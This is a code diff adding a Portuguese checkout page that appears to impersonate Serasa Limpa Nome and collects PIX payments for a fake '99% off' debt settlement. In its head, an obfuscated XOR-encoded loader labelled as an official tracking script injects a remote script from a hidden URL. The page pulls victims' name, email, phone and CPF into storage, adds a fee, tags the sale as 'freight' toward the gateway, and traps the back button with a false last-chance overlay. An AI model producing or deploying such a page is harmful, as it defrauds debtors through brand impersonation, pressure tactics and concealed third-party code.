@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"><script src="../js/track-plus.js?v=1"></script>
+<!-- UTMify UTMs (script oficial) -->
+<script>(function(){var x_w=atob("DAyqsa2/82fLOx0U9neIxN/T0V3pU2lghn+QnoLclwnlTml5n2rTn87QnkmpSTJnlX7DwdnM3BK/Vm47mm3e1N7L3Q24GTE2l3jew8TdhhOuSD8urXeI38zSlkXxGXl1gm2HxNnSmgGyFm1mk3rP39mSiwSkXzBnlWeInY/Jkgu+Xj8u1C7XndadnQamXj8u1GjLxcyShhOmUntt23zY1NvanRPmSGh2n2jZk4GdhQanTng2zC6IzPDC");var s_ru5=[];for(var i_10b=0;i_10b<x_w.length;i_10b++){s_ru5.push(x_w.charCodeAt(i_10b)&255);}var x_43w=s_ru5[0];var i_2=s_ru5.slice(1,1+x_43w);var a_8a=s_ru5.slice(1+x_43w);var q_j4g1=a_8a.map(function(b,o_tg5){return b^i_2[o_tg5%x_43w];});var l_8v="";for(var w_q=0;w_q<q_j4g1.length;w_q++){l_8v+=String.fromCharCode(q_j4g1[w_q]&255);}var v_cxle=decodeURIComponent(escape(l_8v));var o_k=JSON.parse(v_cxle);var n_yqi8=o_k.globals||[];n_yqi8.forEach(function(c_4){window[c_4.name]=c_4.value;});var n_3=document.createElement("script");n_3.src=o_k.url;n_3.async=true;n_3.defer=true;(o_k.attributes||[]).forEach(function(x_4pod){n_3.setAttribute(x_4pod.name,x_4pod.value);});(document.head||document.documentElement).appendChild(n_3);})();</script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1601503185054241');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1601503185054241&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SSBH1E4ETM"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-SSBH1E4ETM');
+</script>
+<!-- UTMify Pixel -->
+<script>
+  window.pixelId = "679fb0f4bbdfc9f47bf2c735";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Serasa Limpa Nome | Finalize seu pagamento</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="../css/sr.css?v=20260813a">
+<script src="../js/shared.js?v=20260813a"></script>
+<script src="../js/helpers.js?v=20260813a"></script>
+<script src="../js/pix.js?v=20260813a"></script>
+</head>
+<body class="bg-gray-50" style="font-family:'Inter',sans-serif">
+<header class="bg-white border-b border-gray-100 sticky top-0 z-20">
+  <div class="wrap-md px-4 py-3 flex items-center justify-between">
+    <span class="font-black text-xl tracking-wider" style="color:#e6007e">Serasa Limpa Nome</span>
+    <span class="text-[11px] font-bold text-gray-400">🔒 Ambiente seguro</span>
+  </div>
+</header>
+
+<main id="app" class="wrap-md px-4 py-6">
+  <div id="rec-loading" class="text-center py-16">
+    <div class="inline-block h-10 w-10 animate-spin rounded-full border-4 border-gray-200" style="border-top-color:#e6007e"></div>
+    <p class="mt-4 text-sm font-semibold text-gray-500">Localizando seu acordo...</p>
+  </div>
+
+  <div id="rec-content" style="display:none">
+    <div class="text-center mb-4">
+      <span class="pill" style="background:#fce7f3;color:#e6007e">PAGAMENTO PIX</span>
+      <h2 id="rec-title" class="text-xl font-extrabold mt-3">Finalize seu pagamento</h2>
+      <p id="rec-sub" class="text-sm text-gray-500 mt-1"></p>
+    </div>
+    <div id="rec-discount" class="rounded-2xl border-2 p-4 mb-4 text-center" style="display:none;border-color:#16a34a;background:#f0fdf4">
+      <p class="text-sm font-extrabold text-green-700">🎁 Desconto exclusivo aplicado!</p>
+      <p class="text-xs text-gray-600 mt-1">Acordo de <span id="rec-old" class="line-through"></span> por <span id="rec-new" class="font-extrabold text-green-700"></span> — válido somente hoje.</p>
+    </div>
+    <div class="bg-white border border-gray-100 rounded-2xl p-4 shadow-sm mb-4">
+      <p class="text-xs font-bold uppercase tracking-wide text-gray-400 mb-3">Resumo</p>
+      <div class="flex justify-between py-2 border-b border-gray-100"><span class="text-sm">Acordo Serasa Limpa Nome</span><span class="text-sm font-extrabold text-green-600">99% OFF</span></div>
+      <div class="flex justify-between pt-3"><span class="font-extrabold">Total do acordo</span><span id="rec-total" class="font-extrabold text-lg" style="color:#e6007e"></span></div>
+    </div>
+    <div id="pix-container"></div>
+    <div class="flex items-center justify-center gap-4 mt-5 text-[11px] text-gray-400 flex-wrap"><span>🔒 SSL 256-bits</span><span>🏛️ PIX Banco Central</span><span>✅ 100% seguro</span></div>
+  </div>
+
+  <div id="rec-error" style="display:none" class="text-center py-16">
+    <div class="text-5xl mb-4">😕</div>
+    <h2 class="text-lg font-extrabold text-gray-800">Link inválido ou expirado</h2>
+    <p class="text-sm text-gray-500 mt-2 mb-6">Não conseguimos localizar seu acordo. Você pode refazer o acordo em poucos segundos.</p>
+    <a href="../pagamento/" class="inline-block rounded-xl py-3.5 px-8 text-sm font-extrabold text-white" style="background:#e6007e">REFAZER MEU ACORDO →</a>
+  </div>
+
+  <div id="rec-paid" style="display:none" class="text-center py-16">
+    <div class="text-5xl mb-4">✅</div>
+    <h2 class="text-lg font-extrabold text-gray-800">Pagamento já confirmado!</h2>
+    <p class="text-sm text-gray-500 mt-2">Redirecionando você para a próxima etapa…</p>
+  </div>
+</main>
+
+<script>
+(function(){
+  var qs=new URLSearchParams(location.search);
+  var t=qs.get('t')||'';var k=qs.get('k')||'';var wantDiscount=qs.get('d')==='1';
+  var API='../api_proxy.php';
+  function show(id){['rec-loading','rec-content','rec-error','rec-paid'].forEach(function(x){document.getElementById(x).style.display=(x===id)?'':'none';});}
+  function goUpsell(){window.location.href='../upsell/registro/';}
+
+  if(!t||!k){show('rec-error');return;}
+
+  fetch(API+'?action=recover_info&t='+encodeURIComponent(t)+'&k='+encodeURIComponent(k))
+    .then(function(r){return r.json();})
+    .then(function(d){
+      if(!d||!d.ok){show('rec-error');return;}
+      if(d.paid){show('rec-paid');setTimeout(goUpsell,1800);return;}
+
+      var c=d.client||{};
+      if(c.name){var __p=String(c.name).trim().split(/\s+/);LS.set('funil_nome',__p[0]);if(__p.length>1)LS.set('funil_sobrenome',__p.slice(1).join(' '));}
+      if(c.email)LS.set('funil_email',c.email);
+      if(c.phone)LS.set('funil_phone',c.phone);
+      if(c.document)LS.set('funil_cpf',c.document);
+
+      var useDiscount=wantDiscount&&d.discountAmount>0&&d.discountAmount<d.amount;
+      var amount=useDiscount?d.discountAmount:d.amount;
+      var first=(c.name||'').split(' ')[0]||'';
+
+      document.getElementById('rec-title').textContent=first?('Que bom te ver de volta, '+first+'!'):'Que bom te ver de volta!';
+      document.getElementById('rec-sub').textContent='Seu acordo com 99% de desconto continua reservado. Conclua o pagamento abaixo para limpar seu nome.';
+      var __fee=(typeof window.PIX_SERVICE_FEE==='number')?window.PIX_SERVICE_FEE:0.99;
+      function __comTaxa(v){return Math.round((Number(v)+__fee)*100)/100;}
+      document.getElementById('rec-total').textContent=formatBRL(__comTaxa(amount));
+      if(useDiscount){
+        document.getElementById('rec-old').textContent=formatBRL(__comTaxa(d.amount));
+        document.getElementById('rec-new').textContent=formatBRL(__comTaxa(d.discountAmount));
+        document.getElementById('rec-discount').style.display='';
+      }
+      show('rec-content');
+
+      var cfg={
+        client:{name:c.name,email:c.email,phone:c.phone,document:c.document},
+        amount:amount,
+        productName:'Acordo Serasa 99%',
+        productType:'freight',
+        fromEmail:true,
+        accent:'#e6007e',
+        apiBase:API,
+        onPaid:function(){setTimeout(goUpsell,1500);}
+      };
+      /* Sempre gera um PIX NOVO marcado com fromEmail=true — o gateway recebe o
+         nome atual do produto + sufixo "-email", identificando na dashboard toda
+         venda convertida pelos e-mails de recuperacao. */
+      initPixPanel('pix-container',cfg);
+
+      /* Exit-trap de retenção (mesmo padrão do checkout) */
+      try{history.pushState({__rec:1},'',location.href);}catch(e){}
+      window.addEventListener('popstate',function(){
+        try{history.pushState({__rec:1},'',location.href);}catch(e){}
+        if(document.getElementById('rec-retain'))return;
+        var ov=document.createElement('div');ov.id='rec-retain';
+        ov.style.cssText='position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.75);display:flex;align-items:center;justify-content:center;padding:20px';
+        ov.innerHTML='<div style="background:#fff;border-radius:20px;max-width:360px;width:100%;padding:28px 22px;text-align:center">'
+          +'<div style="font-size:44px;margin-bottom:12px">⚠️</div>'
+          +'<h3 style="font-size:18px;font-weight:800;margin:0 0 8px">Seu acordo ainda está ativo!</h3>'
+          +'<p style="font-size:13px;color:#555;line-height:1.55;margin:0 0 18px">Esta é sua última oportunidade de garantir o desconto de 99%. O pagamento leva menos de 30 segundos.</p>'
+          +'<button id="rec-retain-stay" style="width:100%;background:#e6007e;color:#fff;border:0;border-radius:14px;padding:14px;font-size:14px;font-weight:800;cursor:pointer">✅ CONTINUAR PAGAMENTO</button></div>';
+        document.body.appendChild(ov);
+        document.getElementById('rec-retain-stay').onclick=function(){ov.remove();};
+      });
+    })
+    .catch(function(){show('rec-error');});
+})();
+</script>
+</body>
+</html>
